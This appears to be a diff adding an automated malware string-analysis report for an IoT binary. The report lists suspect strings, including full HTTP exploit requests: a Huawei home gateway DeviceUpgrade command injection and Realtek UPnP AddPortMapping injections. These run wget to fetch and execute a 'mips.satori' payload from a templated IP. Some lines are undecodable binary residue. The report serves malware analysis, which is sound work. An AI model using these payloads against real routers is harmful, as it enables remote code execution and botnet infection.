@@ -1,0 +1,50 @@
+=============================================================================
+========	BINARY ID :76f5827563656bf2b09e4b0f78416931c36c3a9e==================================================
+================================================================================
+================================================================================
+========	STRINGS SUMMARY : =====================================================
+================================================================================
+TOTAL STRINGS COUNT :114
+SUPSCPECTED LINES COUNT :9
+SUPSCPECTED STRINGS COUNT (DISTINCT) :8
+SUPSCPECTED STRINGS WEIGHT :33
+SUSPECT STRING SCORE : [33 / 150] 22%
+USER AGENTS STRINGS COUNT :3
+STATIC IPs STRINGS COUNT :0
+DYNAMIC IPs STRINGS COUNT :0
+================================================================================
+========	STRINGS DETAILS : =====================================================
+================================================================================
+================================================================================
+========	SUSPECTED STRINGS : =====================================================
+================================================================================
+%29 HTTP/1.0\r\n\r\n
+ HTTP/1.0\r\n\r\n
+POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\nHost: 127.0.0.1:37215\r\nUser-Agent: Hello-World\r\nContent-Length: 413\r\nConnection: keep-alive\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAuthorization: Digest username="dslf-config", realm="HuaweiHomeGateway", nonce="88645cefb1f9ede0e336e3569d75ee30", uri="/ctrlt/DeviceUpgrade_1", response="3612f843a42db38f48f59d2a3597e19c", algorithm="MD5", qop="auth", nc=00000001, cnonce="248d1a2560100669"\r\n\r\n<?xml version="1.0" ?>\r\n    <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">\r\n    <s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">\r\n    <NewStatusURL>$(/bin/busybox wget -g %d.%d.%d.%d -l /tmp/.f -r /g/h;sh /tmp/.f)</NewStatusURL>\r\n<NewDownloadURL></NewDownloadURL>\r\n</u:Upgrade>\r\n    </s:Body>\r\n    </s:Envelope>\r\n\r\n
+POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 620\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;cp $SHELL %s;>%s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n
+POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 642\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;wget http://%d.%d.%d.%d/mips.satori -O -> %s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n
+POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 620\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;chmod +x %s;./%s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n
+ @養㟀ޤႢࠀ႔Ƞ႐ကⓀ@႒ሀ!က@ᰑᒖȠꊀ＿耂ᴀꊀ 耢☀!ꄀ។ꊀ 耒܀ꊀ¤ې䱠႒ሀ႖က耐⬀႔Ƞ耨ࠀⓀ@@ې䱠ႂ＿႐Ġ뼐럿⛂䱠ް뒺ې䱠ᒖȠ@đ႒᠀ꊀ＿耒
+ @ሐ႐ጀႠࠀ@휄႐ᔀʐᄠꒀࠀ耊䨀քƠҪౠ@퀄႐ᔀ⾃ၠᗄሀֆࡀゃၠꂀƀ耒㼀¤נᓂ٠ꂀ`耂㰀քƠჂǠꂀၠ耒㤀⢃Ⴀ@뼄႐ሀႄሀ耐
+ @똆႐ᄀ耐ᘀႤᄀ䷄ŀ䳂ᄀꂀɀ耲܀ҠĠ႐ሀҒƠ@ꬆ▔ကҠĠҤƠꒀ᐀뼆ނ֪Šꖀ
+================================================================================
+========	USER AGENTS STRINGS : =====================================================
+================================================================================
+POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 620\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;cp $SHELL %s;>%s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n
+POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 642\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;wget http://%d.%d.%d.%d/mips.satori -O -> %s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n
+POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 620\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;chmod +x %s;./%s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n
+================================================================================
+========	STATIC IP ADRESSES : =====================================================
+================================================================================
+================================================================================
+========	DYNAMIC IP MASKS : =====================================================
+================================================================================
+================================================================================
+========	/proc FOLDER ACCESS : =====================================================
+================================================================================
+================================================================================
+========	HISTORY TEMPERING : =====================================================
+================================================================================
+================================================================================
+========	AUTOINSTALL COMMANDS : =====================================================
+================================================================================
